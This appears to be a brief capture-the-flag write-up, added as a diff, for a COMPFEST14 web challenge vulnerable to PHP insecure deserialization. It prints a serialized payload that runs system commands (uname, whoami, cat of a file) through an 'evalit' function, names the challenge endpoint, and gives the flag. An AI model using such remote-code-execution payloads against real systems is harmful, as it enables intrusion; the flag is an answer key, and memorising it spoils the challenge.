@@ -1,0 +1,13 @@
+given a Web that vuln to an Insecure Deserialization
+just give 1 request to get the Base64 encoded object.
+Decode it and modify the object to run evalit function
+and pass the argument of Command (RCE), and just
+cat the FLAG!
+
+payload (object) : 
+a:2:{i:0;s:6:"evalit";i:1;s:67:"system('uname -a; echo "|"; whoami; echo "|"; cat /Heyheyhey.txt');";}
+
+endpoint : http://103.185.38.238:17227/?input={Base64 encoded payload}
+
+
+FLAG : COMPFEST14{welcome_to_the_root}
